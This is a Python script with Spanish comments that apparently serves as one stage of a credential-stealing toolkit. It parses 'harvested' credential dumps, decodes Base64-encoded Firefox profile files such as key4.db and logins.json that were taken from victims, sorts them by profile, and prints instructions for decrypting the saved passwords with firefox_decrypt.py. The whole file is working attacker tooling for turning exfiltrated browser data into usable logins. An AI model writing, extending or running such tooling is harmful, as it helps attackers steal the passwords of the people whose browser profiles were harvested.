#!/usr/bin/env python3
"""
Firefox Files Extractor
Extrae archivos Base64 de Firefox del archivo credentials_*.txt
y los guarda en harvested/firefox/<profile>/

Uso:
    python extract_firefox_files.py harvested/credentials_1_20251020_063110.txt
"""

import sys
import re
import base64
from pathlib import Path


def extract_firefox_files(credentials_file):
    """
    Extrae archivos de Firefox del archivo de credenciales

    Args:
        credentials_file: Ruta al archivo credentials_*.txt
    """
    creds_path = Path(credentials_file)

    if not creds_path.exists():
        print(f"[!] ERROR: File not found: {credentials_file}")
        return

    # Leer archivo de credenciales
    with open(creds_path, 'r', encoding='utf-8') as f:
        content = f.read()

    # Buscar bloques de Firefox-RAW
    # Formato: [#X] [Firefox-RAW]
    #         URL: <profile>::<filename>
    #         User: XXXXX bytes
    #         Pass: <base64_data>

    firefox_pattern = r'\[#\d+\] \[Firefox-RAW\]\s+URL: (.*?)::(.*?)\s+User: .*?\s+Pass: (.*?)(?=\n\[#|\n\n|$)'

    matches = re.findall(firefox_pattern, content, re.DOTALL)

    if not matches:
        print("[!] No Firefox-RAW files found in credentials file")
        return

    print(f"\n[+] Found {len(matches)} Firefox files")

    # Directorio base para guardar archivos
    base_dir = Path("harvested") / "firefox"
    base_dir.mkdir(parents=True, exist_ok=True)

    files_extracted = {}

    for profile_name, filename, b64_data in matches:
        # Crear directorio del perfil
        profile_dir = base_dir / profile_name
        profile_dir.mkdir(exist_ok=True)

        # Decodificar Base64
        try:
            file_data = base64.b64decode(b64_data.strip())

            # Guardar archivo
            output_file = profile_dir / filename
            with open(output_file, 'wb') as f:
                f.write(file_data)

            print(f"[+] Extracted: {output_file} ({len(file_data)} bytes)")

            # Trackear archivos por perfil
            if profile_name not in files_extracted:
                files_extracted[profile_name] = []
            files_extracted[profile_name].append(filename)

        except Exception as e:
            print(f"[!] ERROR extracting {profile_name}::{filename}: {e}")

    # Resumen
    print(f"\n{'='*60}")
    print(f"[+] Extraction Summary:")
    print(f"{'='*60}\n")

    for profile, files in files_extracted.items():
        profile_path = base_dir / profile
        print(f" Profile: {profile}")
        print(f"   Location: {profile_path}")
        print(f"   Files: {', '.join(files)}")
        print()

        # Verificar si tenemos los archivos necesarios para decrypt
        has_key4 = 'key4.db' in files
        has_logins = 'logins.json' in files

        if has_key4:
            print(f"    Ready for NSS decrypt")
            if has_logins:
                print(f"    logins.json found (old Firefox)")
            else:
                print(f"     No logins.json (modern Firefox, may need signons.sqlite)")
        else:
            print(f"    Missing key4.db - cannot decrypt")
        print()

    print(f"\n[+] Next steps:")
    print(f"    1. Run firefox_decrypt.py on each profile:")
    for profile in files_extracted.keys():
        profile_path = base_dir / profile
        print(f"       python tools/firefox_decrypt.py {profile_path}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python extract_firefox_files.py <credentials_file>")
        print("\nExample:")
        print("  python extract_firefox_files.py harvested/credentials_1_20251020_063110.txt")
        sys.exit(1)

    credentials_file = sys.argv[1]
    extract_firefox_files(credentials_file)


if __name__ == "__main__":
    main()
